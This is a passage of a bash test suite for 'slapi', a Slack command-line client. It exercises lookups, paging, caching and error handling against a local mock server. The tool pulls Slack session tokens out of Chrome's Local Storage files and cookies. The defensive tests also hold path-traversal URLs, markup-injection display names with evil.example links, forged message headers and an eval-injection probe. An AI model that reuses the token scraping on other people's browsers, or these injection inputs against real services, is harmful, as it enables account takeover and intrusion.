check "zero-width space is still removed" lacks "$out" "$(printf 'zero\xe2\x80\x8bwidth')"
check "tag characters are still removed" lacks "$out" "$(printf '\xf3\xa0\x81\x81')"

HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-wrong' SLAPI_XOXC=xoxc-fake-1 "$SLAPI" search anything >/dev/null 2>&1
check "a failed search fails" equals "$?" "1"
check "a failed search leaves no scratch directory" equals "$(find "$T/.cache/slapi" -name 'run.*' | wc --lines)" "0"
T4="$W/home4"
mkdir --parents "$T4"
HOME="$T4" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-wrong' SLAPI_XOXC=xoxc-fake-1 "$SLAPI" read general >/dev/null 2>&1
check "a failed cold-cache run leaves no files behind" equals "$(find "$T4/.cache" -type f | wc --lines)" "0"

T5="$W/home5"
mkdir --parents "$T5"
out=$(HOME="$T5" SLAPI_BASE_URL='http://127.0.0.1:1/api' SLAPI_D_COOKIE='xoxd-fake%2Bcookie' SLAPI_XOXC=xoxc-fake-1 "$SLAPI" read general 2>&1)
check "a dead endpoint fails once, not once per fallback" equals "$(grep --count 'slapi: curl failed' <<<"$out")" "1"
check "a dead endpoint is not reported as a name that matched nothing" lacks "$out" "no conversation matches"

python3 - "$W/hang.port" <<'PY' &
import socket, sys
srv = socket.socket()
srv.bind(("127.0.0.1", 0))
srv.listen(5)
open(sys.argv[1], "w").write(str(srv.getsockname()[1]))
held = []
while True:
    held.append(srv.accept()[0])
PY
hang_pid=$!
for _ in $(seq 50); do
  [ -s "$W/hang.port" ] && break
  sleep 0.1
done
T6="$W/home6"
mkdir --parents "$T6"
SECONDS=0
out=$(HOME="$T6" SLAPI_BASE_URL="http://127.0.0.1:$(cat "$W/hang.port")/api" SLAPI_MAX_TIME=2 SLAPI_D_COOKIE='xoxd-fake%2Bcookie' SLAPI_XOXC=xoxc-fake-1 timeout 30 "$SLAPI" read general 2>&1)
rc=$?
kill "$hang_pid" 2>/dev/null
check "a stalled server ends in an error" equals "$rc" "1"
check "a stalled server is given up on quickly" [ "$SECONDS" -lt 10 ]
check "a stalled server says why" contains "$out" "curl failed"

mk_profile() {
  local dir="$1/.config/google-chrome/Default/Local Storage/leveldb" tok
  shift
  mkdir --parents "$dir"
  : >"$dir/000001.ldb"
  for tok in "$@"; do
    printf 'a\x00%s\x00b' "$tok" >>"$dir/000001.ldb"
  done
}
scan_run() { HOME="$1" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-fake%2Bcookie' env --unset SLAPI_XOXC "$SLAPI" "${@:2}"; }
mk_profile "$W/p1" xoxc-fake-1 xoxc-stale-9
check "a stale token next to a live one is skipped" equals "$(scan_run "$W/p1" whoami 2>&1)" "dung @ Acme https://acme.slack.com/"
mk_profile "$W/p2" xoxc-fake-1 xoxc-fake-b
out=$(scan_run "$W/p2" whoami 2>&1)
check "two live workspaces are named, not guessed" contains "$out" "Acme,Other Co"
check "two live workspaces say how to choose" contains "$out" "SLAPI_TEAM"
mk_profile "$W/p3" xoxc-stale-8 xoxc-stale-9
check "only dead tokens say so" contains "$(scan_run "$W/p3" whoami 2>&1)" "accepts none of them"

out=$(run search mineonly --mine)
check "--mine keeps a hit from a conversation you are in" contains "$out" "mine hit"
check "--mine drops a hit from one you are not in" lacks "$out" "elsewhere hit"
check "without --mine both hits are there" contains "$(run search mineonly)" "elsewhere hit"

run read DEPLOYMENTS >/dev/null 2>&1
check "an id-shaped name still resolves as a name" equals "$(chan)" "C0000018R"
run read UPDATES123 >/dev/null 2>&1
check "a user-id-shaped name still resolves as a name" equals "$(chan)" "C0000019S"
run read C0000001A >/dev/null 2>&1
check "a real channel id is still used as it is" equals "$(chan)" "C0000001A"

###
echo "-- matching, permalinks, dates, downloads"
run read Gen >/dev/null 2>&1
check "an uppercase fuzzy query still matches lowercase names" equals "$(chan)" "C0000001A"
run read '@Ali' >/dev/null 2>&1
check "an uppercase @ query matches a lowercase DM" equals "$(chan)" "D0000003C"
run read WORKSPACES >/dev/null 2>&1
check "a user-id-shaped word can still fuzzy-match a channel" equals "$(chan)" "C0000020T"
check "a channel purpose fills in for an empty topic" contains "$(run search-channels legacy --archived --concise)" "#old-project  C0000006F  legacy announcements"

sanitize_run() { HOME="$T" SLAPI_UNDER_TEST="$SLAPI" bash -c 'source "$SLAPI_UNDER_TEST"; sanitize' harness; }
out=$(printf 'ok \xff\xc3( fine \x1b[31m' | sanitize_run)
check "sanitize survives invalid UTF-8" equals "$?" "0"
check "sanitize keeps the text before the bad bytes" contains "$out" "ok"
check "sanitize keeps the text after the bad bytes" contains "$out" "fine"
check "sanitize still strips controls beside bad bytes" clean "$out"

run read 'https://acme.slack.com/archives/C0000001A/p1790000200000100' >/dev/null 2>&1
call=$(last_call conversations.history)
check "read from a permalink starts at that message" equals "$(jq --raw-output .latest <<<"$call")" "1790000200.000100"
check "read from a permalink includes that message" equals "$(jq --raw-output .inclusive <<<"$call")" "true"
run read 'https://acme.slack.com/archives/C0000001A/p1790000200000100' --latest 1790000500 >/dev/null 2>&1
check "an explicit --latest beats the permalink" equals "$(jq --raw-output .latest <<<"$(last_call conversations.history)")" "1790000500"

TZ=America/New_York run search term --after 2026-03-09 --before 2026-11-01 --limit 3 >/dev/null 2>&1
q=$(jq --raw-output .query <<<"$(last_call search.messages)")
check "DST: after is one calendar day earlier" contains "$q" "after:2026-03-08"
check "DST: before is one calendar day later" contains "$q" "before:2026-11-02"

gets_before=$(count_gets)
out=$(run file F0000000013 2>&1)
check "a file hosted outside Slack is not fetched" contains "$out" "lives outside Slack's file store"
check "a file hosted outside Slack caused no request" equals "$(count_gets)" "$gets_before"

for f in --public --mine --bots "--types im" "--context 1"; do
  # shellcheck disable=SC2086
  run search invoice --files $f >/dev/null 2>&1
  check "search --files refuses $f" equals "$?" "1"
done
check "the --files refusal says why" contains "$(run search invoice --files --mine 2>&1)" "they do nothing with --files"

###
echo "-- credential guard, live checks, shared cache"
for u in 'https://files.slack.com/files-pri/x/../../api/chat.postMessage?channel=C1&text=x' 'https://files.slack.com/files-pri/x/%2e%2e/api/users.list' \
  'https://files.slack.com/files-pri/x/%2E%2E/%2E%2E/api/users.list' 'https://files.slack.com/files-pri/T1-F1/..'; do
  check "guard: dot segments get no credentials: $u" unguarded "$u"
done
check "guard: a dot inside a file name is fine" guard 'https://files.slack.com/files-pri/T1-F1/report.final.v2.pdf'
FN=show_files
sourced x "http://127.0.0.1:$PORT/files-pri/T1-F1/../../secret" --out "$DL" >/dev/null 2>&1
check "a download keeps the path exactly as given" contains "$(jq --slurp --raw-output 'map(select(.get != null)) | last | .get' "$LOG")" "/../"

check "a name with an uppercase non-ASCII letter resolves" contains "$(run profile 'Ánh Nguyen' 2>&1)" "User ID: UAAAAAAA6"

run whoami >/dev/null 2>&1
out=$(HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-wrong' SLAPI_XOXC=xoxc-fake-1 "$SLAPI" whoami 2>&1)
check "whoami sees a dead session even with a warm cache" contains "$out" "auth.test: not_authed"

check "canvas refuses a file that is not a canvas" contains "$(run canvas F0000000001 2>&1)" "is not a canvas (its type is unknown)"
gets_before=$(count_gets)
out=$(run canvas F0000000014 2>&1)
check "canvas refuses a URL off Slack's file store" contains "$out" "lives outside Slack's file store"
check "canvas made no request for it" equals "$(count_gets)" "$gets_before"

out=$(run read 'https://acme.slack.com/archives/C0000001A/p1790000400000100?thread_ts=1790000300.000100&cid=C0000001A' 2>"$ERR")
check "read on a reply permalink says it shows the thread" contains "$(cat "$ERR")" "thread reply"
check "read on a reply permalink opens the parent thread" equals "$(jq --raw-output .ts <<<"$(last_call conversations.replies)")" "1790000300.000100"
check "read on a reply permalink prints the thread" contains "$out" "thread 1790000300.000100"

mk_profile "$W/p4" xoxc-fake-1 xoxc-stale-9
before=$(count_calls auth.test)
scan_run "$W/p4" whoami >/dev/null 2>&1
first=$(($(count_calls auth.test) - before))
before=$(count_calls auth.test)
scan_run "$W/p4" whoami >/dev/null 2>&1
second=$(($(count_calls auth.test) - before))
check "the first run probes both candidates, then whoami asks" equals "$first" "3"
check "the next run remembers the live token" equals "$second" "1"
scan_run "$W/p4" refresh
before=$(count_calls auth.test)
scan_run "$W/p4" whoami >/dev/null 2>&1
check "refresh forgets the choice" equals "$(($(count_calls auth.test) - before))" "3"
check "the remembered choice is a hash, not a token" equals "$(grep --recursive --files-with-matches 'xoxc-' "$W/p4/.cache" | wc --lines)" "0"

run_in() { HOME="$1" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_D_COOKIE='xoxd-fake%2Bcookie' SLAPI_XOXC=xoxc-fake-1 "$SLAPI" "${@:2}"; }
T7="$W/home7"
mkdir --parents "$T7"
run_in "$T7" read hr >/dev/null 2>&1
before=$(count_calls conversations.list)
run_in "$T7" search-channels people >/dev/null 2>&1
check "read and search-channels share one workspace channel list" equals "$(count_calls conversations.list)" "$before"

knobs() { env "$@" HOME="$T" SLAPI_UNDER_TEST="$SLAPI" bash -c 'source "$SLAPI_UNDER_TEST"; echo "$API_MAX_TIME $DOWNLOAD_MAX_TIME"' harness; }
check "the API timeout does not shorten downloads" equals "$(knobs SLAPI_MAX_TIME=7)" "7 300"
check "the download timeout has its own knob" equals "$(knobs SLAPI_DOWNLOAD_MAX_TIME=9)" "60 9"

run search x --context 101 >/dev/null 2>&1
check "--context above 100 is refused" equals "$?" "1"
out=$(run search term --types private_channel --context 1 --limit 1 2>&1)
check "a context failure names its cause" contains "$out" "conversations.history: channel_not_found"

###
echo "-- flags, case folding, token probes, cookies"
check "a flag the command does not take is refused" contains "$(run read general --after 2026-09-20 2>&1)" "read does not take --after, slapi help read lists its flags"
check "thread does not take --asc" contains "$(run thread general p1790000300000100 --asc 2>&1)" "thread does not take --asc"
check "channels does not take --concise" contains "$(run channels --concise 2>&1)" "channels does not take --concise"
run read general --limit 1 --concise >/dev/null 2>&1
check "a flag the command does take is fine" equals "$?" "0"
check "--help works after other arguments" equals "$(bare search invoice --help 2>&1)" "$(bare help search)"
run search -- -h >/dev/null 2>&1
check "-h after -- is a search word, not help" equals "$(jq --raw-output .query <<<"$(last_call search.messages)")" "-h"

check "search-users folds a Vietnamese capital" contains "$(run search-users ánh 2>&1)" "Name: anh.n"
check "search-users folds the query too" contains "$(run search-users ÁNH 2>&1)" "Name: anh.n"
check "profile folds non-ASCII case" contains "$(run profile 'ánh nguyen' 2>&1)" "User ID: UAAAAAAA6"
check "search-channels folds non-ASCII case" contains "$(run search-channels đội 2>&1)" "Name: #viet-team"
check "search-channels folds an uppercase Vietnamese query" contains "$(run search-channels ĐỘI 2>&1)" "Name: #viet-team"

run search x --context 08 --limit 1 >/dev/null 2>&1
check "--context 08 is not an octal error" equals "$?" "0"
run search term --types private_channel --context 010 --limit 1 >/dev/null 2>&1
check "--context 010 means ten" equals "$(jq --raw-output .limit <<<"$(last_call conversations.history)")" "10"

mk_profile "$W/p5" xoxc-fake-1 xoxc-flaky-3
out=$(scan_run "$W/p5" whoami 2>&1)
check "a probe failure that is not a rejection is reported as one" contains "$out" "could not ask Slack whether a token is live"
check "and does not claim the tokens are dead" lacks "$out" "accepts none of them"
check "and remembers nothing" equals "$(find "$W/p5/.cache" -name 'live-*' | wc --lines)" "0"

run read CONTRIBUTORS >/dev/null 2>&1
check "an id-shaped name without a digit resolves by name in the workspace" equals "$(chan)" "C0000021U"
run read CABCDEFGHI >/dev/null 2>&1
check "an id-shaped word that names nothing is used as an id" equals "$(chan)" "CABCDEFGHI"

mkdir --parents "$W/curlshim"
cat >"$W/curlshim/curl" <<'SH'
#!/bin/sh
out=""
while [ $# -gt 0 ]; do
  [ "$1" = "--output" ] && out="$2"
  shift
done
printf '<html>plain page</html>' >"$out"
printf '200 text/html'
SH
chmod +x "$W/curlshim/curl"
out=$(PATH="$W/curlshim:$PATH" run file https://example.com/page --out "$DL" 2>&1)
check "an HTML page from a non-Slack URL is just a download" starts "$out" "$DL/url-"
check "and it is saved" contains "$(cat "$out")" "plain page"

check "sourcing the script succeeds under set -e" equals "$(SLAPI_UNDER_TEST="$SLAPI" bash -c 'set -e; source "$SLAPI_UNDER_TEST"; echo sourced' harness)" "sourced"

mkdir --parents "$W/cookieshim" "$W/cookieshim2"
cat >"$W/cookieshim/chrome-cookies-linux" <<'SH'
#!/bin/sh
printf '#HttpOnly_.xslack.com\tFALSE\t/\tTRUE\t0\td\txoxd-decoy\n'
printf '#HttpOnly_.slack.com\tFALSE\t/\tTRUE\t1824799262\td\txoxd-fake%%2Bcookie\n'
SH
cat >"$W/cookieshim2/chrome-cookies-linux" <<'SH'
#!/bin/sh
printf '#HttpOnly_.xslack.com\tFALSE\t/\tTRUE\t0\td\txoxd-decoy\n'
SH
chmod +x "$W/cookieshim/chrome-cookies-linux" "$W/cookieshim2/chrome-cookies-linux"
out=$(HOME="$T" PATH="$W/cookieshim:$PATH" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_XOXC=xoxc-fake-1 "$SLAPI" read general 2>&1)
check "the d cookie is parsed from the cookie tool's real output format" contains "$out" "Channel: #general (C0000001A)"
out=$(HOME="$T" PATH="$W/cookieshim2:$PATH" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_XOXC=xoxc-fake-1 "$SLAPI" read general 2>&1)
check "a look-alike host's cookie is not taken" contains "$out" "no usable Slack d cookie"

###
echo "-- edge cases: scratch files, empty names, workspaces, times"
# with several tokens in Chrome the work happens in a subshell that must clean up after itself
mkdir --parents "$W/dl2"
scan_run "$W/p4" file "http://127.0.0.1:1/x.png" --out "$W/dl2" >/dev/null 2>&1
check "a failed download leaves nothing behind even with several tokens in Chrome" equals "$(find "$W/dl2" -type f | wc --lines)" "0"
check "and no scratch directory either" equals "$(find "$W/p4/.cache" -name 'run.*' | wc --lines)" "0"

run profile @ >/dev/null 2>&1
check "profile @ is an error, not somebody's profile" equals "$?" "1"
check "read @ asks for a name" contains "$(run read @ 2>&1)" "nothing after @, give a name"

out=$(run search-users engineer -h 2>&1)
check "-h after other words is a search term, not help" lacks "$out" "slapi search-users <words...>"
check "and the search ran" contains "$out" "## Users ("

out=$(run search term --types public_channel,private_channel --context 1 --limit 2 2>&1)
check "--context is per hit: one hit gets its context" equals "$(grep --count '^Context before:$' <<<"$out")" "1"
check "--context is per hit: another cannot be read" contains "$out" "Context before: unavailable"
run search term --concise --context 2 >/dev/null 2>&1
check "--concise with --context is refused" equals "$?" "1"
check "and says why" contains "$(run search term --concise --context 2 2>&1)" "--concise has no room for --context"

out=$(SLAPI_TEAM="Other Co" scan_run "$W/p2" whoami 2>&1)
check "SLAPI_TEAM picks between two live workspaces" equals "$out" "dung @ Other Co https://acme.slack.com/"
check "the team match ignores case" equals "$(SLAPI_TEAM="other co" scan_run "$W/p2" whoami 2>&1)" "dung @ Other Co https://acme.slack.com/"
check "an unknown SLAPI_TEAM says so" contains "$(SLAPI_TEAM=Nope scan_run "$W/p2" whoami 2>&1)" "no live token in Chrome belongs to a workspace named 'Nope'"
check "several workspaces without SLAPI_TEAM point at it" contains "$(scan_run "$W/p2" whoami 2>&1)" "set SLAPI_TEAM to one of those names"
for v in SLAPI_TEAM SLAPI_XOXC SLAPI_D_COOKIE SLAPI_MAX_TIME SLAPI_DOWNLOAD_MAX_TIME; do
  check "the help documents $v" contains "$(bare help)" "$v"
done

run read general --oldest 0 >/dev/null 2>&1
check "--oldest 0 means from the beginning" equals "$(jq --raw-output .oldest <<<"$(last_call conversations.history)")" "0"
check "a millisecond timestamp is refused" contains "$(run read general --oldest 1790000300000 2>&1)" "cannot parse time for --oldest"

###
echo "-- curl hygiene, rich text, names, locale, workspaces"
# a curl that records how it was called: credentials stay out of argv, rc files stay off
mkdir --parents "$W/curlspy" "$W/dl3"
cat >"$W/curlspy/curl" <<'SH'
#!/bin/sh
dir=$(dirname "$0")
out=""
prev=""
for a in "$@"; do
  [ "$prev" = "--config" ] && [ "$a" = "-" ] && cat >>"$dir/stdin"
  [ "$prev" = "--output" ] && out="$a"
  prev="$a"
done
printf '%s\n' "$@" >>"$dir/args"
case "$*" in
*auth.test*) printf '{"ok": true, "user": "spy", "team": "Spy", "url": "https://spy.slack.com/"}\n200 ' ;;
*)
  [ -n "$out" ] && printf 'PNGDATA' >"$out"
  printf '200 image/png'
  ;;
esac
SH
chmod +x "$W/curlspy/curl"
spy_reset() { : >"$W/curlspy/args" && : >"$W/curlspy/stdin"; }
fetch_spy() {
  HOME="$T" SLAPI_BASE_URL="http://127.0.0.1:$PORT/api" SLAPI_UNDER_TEST="$SLAPI" SLAPI_XOXC=xoxc-fake-1 SLAPI_D_COOKIE='xoxd-fake%2Bcookie' \
    PATH="$W/curlspy:$PATH" bash -c '
    source "$SLAPI_UNDER_TEST"
    [ "$1" = slack ] && is_slack_file_url() { return 0; }
    load_auth
    fetch_url "$2" "$3"
  ' harness "$1" "$2" "$3"
}
spy_reset
PATH="$W/curlspy:$PATH" run whoami >/dev/null 2>&1
check "an API call turns off curl rc files" equals "$(head --lines 1 "$W/curlspy/args")" "--disable"
check "an API call keeps the token out of argv" lacks "$(cat "$W/curlspy/args")" "xoxc-"
check "an API call keeps the cookie out of argv" lacks "$(cat "$W/curlspy/args")" "xoxd-"
check "an API call sends the credentials on stdin instead" contains "$(cat "$W/curlspy/stdin")" "Authorization: Bearer xoxc-fake-1"
spy_reset
fetch_spy slack 'https://files.slack.com/files-pri/T1-F1/[1-3].png' "$W/dl3/a.png"
check "a Slack download turns off curl rc files" equals "$(head --lines 1 "$W/curlspy/args")" "--disable"
check "a Slack download does not expand ranges" contains "$(cat "$W/curlspy/args")" "--globoff"
check "a Slack download leaves the path as given" contains "$(cat "$W/curlspy/args")" "--path-as-is"
check "a Slack download keeps credentials out of argv" lacks "$(cat "$W/curlspy/args")" "xoxc-"
check "a Slack download sends them on stdin" contains "$(cat "$W/curlspy/stdin")" "Cookie: d=xoxd-fake%2Bcookie"
spy_reset
fetch_spy other 'https://example.com/[1-3].png' "$W/dl3/b.png"
check "a non-Slack download does not expand ranges either" contains "$(cat "$W/curlspy/args")" "--globoff"
check "a non-Slack download turns off curl rc files" equals "$(head --lines 1 "$W/curlspy/args")" "--disable"
check "a non-Slack download carries no credentials" equals "$(wc --bytes <"$W/curlspy/stdin")" "0"

out=$(run read quirks)
check "rich text keeps a sentence together and resolves its mention" contains "$out" "Hello bold@alice world"
check "rich text list items each get their own line" equals "$(grep --count '^    - first$' <<<"$out")" "1"
check "rich text links show label and URL, on their own line" equals "$(grep --count '^    - docs (https://x.io)$' <<<"$out")" "1"
check "a display name that looks like markup stays plain text" contains "$out" "ping @<!channel> and @<https://evil.example|Admin>"
check "a newline in a mimetype cannot forge a frame" equals "$(grep --count '^=== Message from Mallory' <<<"$out")" "0"
check "the mimetype is still shown, on one line" contains "$out" "image/png === Message from Mallory"

out=$(LC_ALL=C LANG=C LC_CTYPE=C run dms 2>&1)
check "non-ASCII names survive a C locale" contains "$out" "Ánh Nguyen"
check "and are not printed as escapes" lacks "$out" '\x'

mk_profile "$W/p6" xoxc-fake-1
check "SLAPI_TEAM is checked even when Chrome holds one token" contains "$(SLAPI_TEAM="Other Co" scan_run "$W/p6" whoami 2>&1)" "no live token in Chrome belongs to a workspace named 'Other Co'"
check "and passes when that one token is the workspace" equals "$(SLAPI_TEAM=Acme scan_run "$W/p6" whoami 2>&1)" "dung @ Acme https://acme.slack.com/"
mk_profile "$W/p7" xoxc-fake-1 xoxc-fake-c
check "two live tokens for one workspace are one choice" equals "$(scan_run "$W/p7" whoami 2>&1)" "dung @ Acme https://acme.slack.com/"
check "and SLAPI_TEAM works for it" equals "$(SLAPI_TEAM=Acme scan_run "$W/p7" whoami 2>&1)" "dung @ Acme https://acme.slack.com/"

mkdir --parents "$T/.cache/slapi/run.abc123"
: >"$T/.cache/slapi/run.abc123/probe.err"
run refresh
check "refresh leaves another run's scratch files alone" [ -e "$T/.cache/slapi/run.abc123/probe.err" ]
rm --recursive --force "$T/.cache/slapi/run.abc123"

###
echo "-- frames, blocks, pagination, sanitizing, lookups"
out=$(run read quirks)
check "the first line of a body cannot forge a header" equals "$(grep --count '^=== Message from CEO' <<<"$out")" "0"
check "the forged first line is still shown, indented" contains "$out" "    === Message from CEO (UAAAAAAA1)"
check "an empty attachment text falls through to the title" contains "$out" "  - Real title"
check "block fields are rendered" contains "$out" "prod | *Status*"
check "rich text keeps literal entities and mentions as typed, and shows link and date" contains "$out" "5 &amp; more <@UAAAAAAA2> see the docs (https://x.io/a) due Jul 14"
check "an ordered list is numbered" equals "$(grep --count '^    1. one$' <<<"$out")" "1"
check "and its second item is 2" equals "$(grep --count '^    2. two$' <<<"$out")" "1"
check "concise: an empty attachment text falls through to the fallback" contains "$(run read quirks --concise)" "alerts: [no preview]"

out=$(run search term --limit 2 --types public_channel,private_channel,im 2>"$ERR")
check "search shows exactly --limit hits" contains "$out" "## Messages (2 results)"
check "and resumes right after them" contains "$(cat "$ERR")" "More results: --page 1 --skip 2"
out=$(run search term --limit 2 --types public_channel,private_channel,im --page 1 --skip 2 2>"$ERR")
check "--skip continues where the last call stopped" contains "$out" "dm hit"
check "--skip does not repeat what was shown" lacks "$out" "private hit"
check "a resumed call still shows exactly --limit hits" contains "$out" "## Messages (2 results)"

run read @anh.n >/dev/null 2>&1
check "@handle finds the DM named by display name" equals "$(chan)" "D0000023W"
run read anh.n >/dev/null 2>&1
check "a plain handle finds it too" equals "$(chan)" "D0000023W"
check "an ambiguous user name is flagged" contains "$(run profile sam 2>&1 >/dev/null)" "several users match sam"
T8="$W/home8"
mkdir --parents "$T8"
out=$(HOME="$T8" SLAPI_BASE_URL='http://127.0.0.1:1/api' SLAPI_D_COOKIE='xoxd-fake%2Bcookie' SLAPI_XOXC=xoxc-fake-1 "$SLAPI" profile bob 2>&1)
check "a failed user lookup is not reported as an unknown user" lacks "$out" "no user matches"

out=$(run read empty503 2>&1)
check "an empty error body still names the HTTP status" contains "$out" "conversations.history: HTTP 503 with an empty or unreadable answer"

tokdir=$(find "$T/.cache/slapi" -maxdepth 1 -name 't-*' | head --lines 1)
mkdir --parents "$T/.cache/slapi/run.zzzzzz"
touch --date '3 hours ago' "$tokdir/users.abcdef" "$T/.cache/slapi/run.zzzzzz"
touch "$tokdir/users.fresh1"
run whoami >/dev/null 2>&1
check "a stale cache temp file is reaped" [ ! -e "$tokdir/users.abcdef" ]
check "a stale scratch directory is reaped" [ ! -e "$T/.cache/slapi/run.zzzzzz" ]
check "a fresh temp file is left alone" [ -e "$tokdir/users.fresh1" ]
rm --force "$tokdir/users.fresh1"

###
echo "-- lookups, locale, side effects"
run read @bob.b >/dev/null 2>"$ERR"
check "a user with no 1:1 DM is reported, not fuzzy-matched onto a group chat" contains "$(cat "$ERR")" "no open DM with bob.b"
check "and no conversation was read" equals "$(chan)" "null"
run read '#UAAAAAAA1' >/dev/null 2>&1
check "# never opens a DM, even for a user id" equals "$(chan)" "null"
run read '!gen' >/dev/null 2>&1
check "fzf operators in a query are not operators" equals "$(chan)" "C0000001A"
out=$(LANG=zz_ZZ.UTF-8 run dms 2>&1)
check "a LANG naming a missing locale still gets a UTF-8 one" contains "$out" "Ánh Nguyen"
check "and perl does not complain about it" lacks "$out" "Setting locale failed"
out=$(HOME=/proc/nope "$SLAPI" help 2>&1)
check "help works with an unwritable HOME" equals "$?" "0"
check "and touches nothing on disk" lacks "$out" "cannot create"
mkdir --parents "$W/fresh"
HOME="$W/fresh" "$SLAPI" bogus >/dev/null 2>&1
check "a typo does not create the cache" [ ! -e "$W/fresh/.cache" ]
run search-channels >/dev/null 2>&1
check "search-channels needs a word" equals "$?" "1"

mkdir --parents "$T/.cache/slapi/files"
: >"$T/.cache/slapi/files/keep-me.png"
run refresh
check "refresh never deletes downloaded files" [ -e "$T/.cache/slapi/files/keep-me.png" ]
# a name that matches the reaper's pattern, old enough to be reaped anywhere else
: >"$T/.cache/slapi/files/report.abcdef"
touch --date '3 hours ago' "$T/.cache/slapi/files/report.abcdef"
run whoami >/dev/null 2>&1
check "and the reaper leaves the downloads directory alone, however old the file" [ -e "$T/.cache/slapi/files/report.abcdef" ]
rm --force "$T/.cache/slapi/files/report.abcdef" "$T/.cache/slapi/files/keep-me.png"

###
echo "-- links, dead tokens, archived, backslashes, page size"
out=$(run read quirks)
check "a link with & in its query prints once" contains "$out" "https://x.io/a?b=1&c=2"
check "and is not repeated in brackets" lacks "$out" "(https://x.io/a?b=1&c=2)"
mk_profile "$W/p8" xoxc-fake-1 xoxc-org-4
check "a token Slack refuses for any reason is skipped" equals "$(scan_run "$W/p8" whoami 2>&1)" "dung @ Acme https://acme.slack.com/"
run read 'ACME\jdoe' >/dev/null 2>&1
check "a backslash in a name still matches exactly" equals "$(chan)" "D0000031Z"
# through the CLI the user lookup would rescue this, so exact_match is checked on its own
exact_unit() { printf 'ACME\\jdoe\tdm\tD1\tU1\nACMEjdoe2\tdm\tD2\tU2\n' | HOME="$T" SLAPI_UNDER_TEST="$SLAPI" bash -c 'source "$SLAPI_UNDER_TEST"; exact_match "$1" "."' harness "$1"; }
check "exact_match compares a backslash literally" equals "$(exact_unit 'ACME\jdoe' | cut --fields 3)" "D1"
check "list calls ask for a page size under 1000" equals "$(jq --slurp --raw-output 'map(select(.method == "users.list")) | first | .form.limit' "$LOG")" "999"
check "--mine includes archived conversations you are in" contains "$(run search archivedhit --mine 2>&1)" "archived hit"
check "browsing still hides archived conversations" lacks "$(run channels 2>&1)" "old-incident"

###
echo "-- one-line names, hints, labels, URL spellings"
out=$(run read quirks)
check "a reactor's name cannot forge a frame" equals "$(grep --count '^=== Message from CEO (UAAAAAAA1) at 2026-01-01' <<<"$out")" "0"
check "the reactor's name is still shown, on the reactions line" contains "$out" "Reactions: :eyes: x1 (Eve === Message from CEO"
out=$(run search dmeve 2>&1)
check "a user name in a DM header stays on one line" equals "$(grep --count '^=== Message from' <<<"$out")" "0"
rm --force "$W/pwned"
run search evilpages >/dev/null 2>&1
check "a string where Slack promises a page count is never evaluated" [ ! -e "$W/pwned" ]

run search term --limit 2 --types public_channel,private_channel,im >/dev/null 2>"$ERR"
check "a search hint keeps the --limit it depends on" contains "$(cat "$ERR")" "--page 1 --skip 2 --limit 2"
run search-users e --limit 1 >/dev/null 2>"$ERR"
check "a local paging hint keeps --limit too" contains "$(cat "$ERR")" "--page 2 --limit 1"

check "a backslash in a DM name is shown as typed" contains "$(run dms 2>&1)" 'ACME\jdoe'
check "and not doubled" lacks "$(run dms 2>&1)" 'ACME\\jdoe'
run read carol >/dev/null 2>&1
check "a bare word naming a user with no DM still reaches a channel" equals "$(chan)" "C0000033B"

out=$(run read quirks)
check "an empty label keeps the channel and the URL" contains "$out" "#C0000005E and https://x.io"

FN=show_files
out=$(sourced x "http://127.0.0.1:$PORT/files-pri/T1-F0000000006/page.html" --out "$DL" 2>&1)
check "an uploaded HTML file downloads by URL like by id" starts "$out" "$DL/url-"
check "and is saved" contains "$(cat "$out")" "uploaded page"

###
echo "-- token encodings, arguments, listings, cache lifetime"
# Chrome stores a localStorage value as UTF-16LE once it holds a character above U+00FF
mkdir --parents "$W/p9/.config/google-chrome/Default/Local Storage/leveldb"
{ printf 'a\0\0'; printf '%s' "xoxc-fake-1" | iconv --from-code UTF-8 --to-code UTF-16LE; printf '\0\0b'; } >"$W/p9/.config/google-chrome/Default/Local Storage/leveldb/000001.ldb"
check "a token stored as UTF-16LE is still found" equals "$(scan_run "$W/p9" whoami 2>&1)" "dung @ Acme https://acme.slack.com/"

check "read takes one conversation" contains "$(run read big team 2>&1)" "read takes 1 argument(s) here, quote a name that contains spaces"
check "profile takes one user" contains "$(run profile Alice Smith 2>&1)" "profile takes 1 argument(s)"
check "thread takes a channel and a ts" contains "$(run thread general p1790000300000100 extra 2>&1)" "thread takes 2 argument(s)"
check "canvas takes one id" contains "$(run canvas F0000000003 F0000000008 2>&1)" "canvas takes 1 argument(s)"

before=$(count_calls users.conversations)
T10="$W/home10"
mkdir --parents "$T10"
run_in "$T10" read general >/dev/null 2>&1
run_in "$T10" search term --mine --limit 1 >/dev/null 2>&1
check "read plus search --mine share one users.conversations fetch" equals "$(($(count_calls users.conversations) - before))" "1"
check "and the browse list still hides archived channels" lacks "$(run_in "$T10" channels 2>&1)" "old-incident"

T11="$W/home11"
mkdir --parents "$T11"
: >"$W/fail-conversations-list"
out=$(run_in "$T11" read gen 2>&1)
check "a failed workspace listing does not stop a lookup your own conversations can answer" equals "$(chan)" "C0000001A"
check "and says so" contains "$out" "could not list the workspace's channels"
rm --force "$W/fail-conversations-list"

mkdir --parents "$T/.cache/slapi/t-olddead" "$T/.cache/slapi/t-recentdead"
: >"$T/.cache/slapi/t-olddead/users"
touch --date '40 days ago' "$T/.cache/slapi/t-olddead"
run whoami >/dev/null 2>&1
check "a token directory unused for a month is reaped" [ ! -e "$T/.cache/slapi/t-olddead" ]
check "a recent one is kept" [ -e "$T/.cache/slapi/t-recentdead" ]
rmdir "$T/.cache/slapi/t-recentdead"
# a user coming back after a month: the directory in use must survive the reaper
current="$T/.cache/slapi/t-$(printf '%s' xoxc-fake-1 | sha256sum | cut --characters 1-12)"
touch --date '40 days ago' "$current"
run whoami >/dev/null 2>&1
check "the current token directory is never reaped, however old" [ -d "$current" ]
run read general --limit 1 >/dev/null 2>&1
check "and still works afterwards" equals "$?" "0"

check "--before is documented as inclusive of its day" contains "$(bare help search)" "up to and including day D"
